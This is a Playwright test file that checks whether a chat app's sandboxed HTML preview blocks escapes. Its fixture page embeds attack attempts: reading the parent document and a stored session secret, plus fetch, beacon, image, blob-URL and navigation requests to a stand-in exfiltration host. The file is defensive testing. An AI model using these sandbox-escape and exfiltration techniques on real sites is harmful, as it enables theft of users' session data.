import fs from 'node:fs';
import path from 'node:path';
import ts from 'typescript';
import { createServer } from 'node:http';
import { test, expect } from '@playwright/test';
import type { Server } from 'node:http';
import type { AddressInfo } from 'node:net';
import {
  ARTIFACT_PREVIEW_POLICY,
  ARTIFACT_PREVIEW_SHELL,
} from '../../../packages/api/src/artifacts/preview';

const compiled = ts.transpileModule(
  fs.readFileSync(path.resolve(__dirname, '../../../client/src/utils/interactiveHtml.ts'), 'utf8'),
  { compilerOptions: { module: ts.ModuleKind.CommonJS, target: ts.ScriptTarget.ES2022 } },
).outputText;
let server: Server;
let origin: string;
test.beforeEach(async () => {
  server = createServer((req, res) => {
    if (req.url === '/api/artifacts/preview') {
      res.writeHead(200, {
        'Content-Type': 'text/html',
        'Content-Security-Policy': ARTIFACT_PREVIEW_POLICY,
      });
      res.end(ARTIFACT_PREVIEW_SHELL);
      return;
    }
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end('<!doctype html><h1 id="parent">Privater Chat</h1>');
  });
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  origin = 'http://127.0.0.1:' + (server.address() as AddressInfo).port;
});
test.afterEach(async () => {
  server.closeAllConnections();
  await new Promise<void>((resolve) => server.close(() => resolve()));
});

test('HTML supports user interaction while blocking parent access, document and blob escapes', async ({
  page,
}) => {
  const outbound: string[] = [];
  await page.route('https://exfil.invalid/**', (route) => {
    outbound.push(route.request().url());
    return route.abort();
  });
  await page.goto(origin + '/c/synthetic');
  await page.evaluate((code) => {
    const exports: Record<string, unknown> = {};
    new Function('exports', code)(exports);
    const build = exports.interactiveHtmlDocument as (content: string) => string;
    localStorage.setItem('private-session', 'synthetic-parent-secret');
    addEventListener('message', (event) => {
      if (event.data?.type === 'qa-ready') {
        document.body.dataset.ready = String(event.data.parentBlocked && event.data.storageBlocked);
      }
      if (event.data?.type === 'qa-result') document.body.dataset.result = String(event.data.value);
      if (event.data?.type === 'qa-attacks-dispatched') document.body.dataset.attacks = 'done';
    });
    const frame = document.createElement('iframe');
    frame.setAttribute('sandbox', 'allow-scripts');
    frame.style.cssText = 'width:900px;height:600px';
    frame.srcdoc =
      build(`<style>body{margin:0}h1{position:absolute;left:20px;top:0}#hours{position:absolute;left:20px;top:60px}#calc{position:absolute;left:20px;top:100px}#result{position:absolute;left:20px;top:140px}</style>
      <h1>Rechner</h1><input id="hours" aria-label="Stunden" type="number" value="12"><button id="calc">Berechnen</button><output id="result"></output>
      <img src="https://exfil.invalid/static-image"><iframe src="https://exfil.invalid/nested-frame"></iframe>
      <script>
      let parentBlocked=false,storageBlocked=false,calls=0;
      try{top.document.querySelector('#parent').textContent='compromised'}catch{parentBlocked=true}
      try{localStorage.getItem('private-session')}catch{storageBlocked=true}
      fetch('https://exfil.invalid/fetch').catch(()=>{});navigator.sendBeacon('https://exfil.invalid/beacon','sample');
      top.postMessage({type:'qa-ready',parentBlocked,storageBlocked},'*');
      document.querySelector('#calc').onclick=()=>{
        const value=Number(document.querySelector('#hours').value)*150;
        document.querySelector('#result').textContent=value;top.postMessage({type:'qa-result',value},'*');
        if(++calls===2)setTimeout(()=>{
          document.open();document.write('<h2>Dokumentwechsel</h2><img src="https://exfil.invalid/rewrite-image">');document.close();
          fetch('https://exfil.invalid/rewrite-fetch').catch(()=>{});
          location.href='https://exfil.invalid/navigation';
          location.href=URL.createObjectURL(new Blob(['<img src="https://exfil.invalid/blob-image"><script>fetch("https://exfil.invalid/blob-fetch").catch(()=>{})<'+ '/script>'],{type:'text/html'}));
          top.postMessage({type:'qa-attacks-dispatched'},'*');
        },100);
      };
      </script>`);
    document.body.append(frame);
  }, compiled);
  await expect(page.locator('body')).toHaveAttribute('data-ready', 'true');
  const bounds = await page.locator('iframe').boundingBox();
  if (!bounds) throw new Error('Testvorschau ist nicht sichtbar.');
  // Real pointer and keyboard input also covers sandboxed frames hidden by CDP after document.open.
  await page.mouse.click(bounds.x + 50, bounds.y + 112);
  await expect(page.locator('body')).toHaveAttribute('data-result', '1800');
  await page.mouse.click(bounds.x + 60, bounds.y + 70);
  await page.keyboard.press('ControlOrMeta+A');
  await page.keyboard.type('24');
  await page.mouse.click(bounds.x + 50, bounds.y + 112);
  await expect(page.locator('body')).toHaveAttribute('data-result', '3600');
  await expect(page.locator('body')).toHaveAttribute('data-attacks', 'done');
  await page.waitForTimeout(400);
  expect(outbound).toEqual([]);
  await expect(page.locator('#parent')).toHaveText('Privater Chat');
  expect(await page.evaluate(() => localStorage.getItem('private-session'))).toBe(
    'synthetic-parent-secret',
  );
  expect(page.url()).toBe(origin + '/c/synthetic');
});
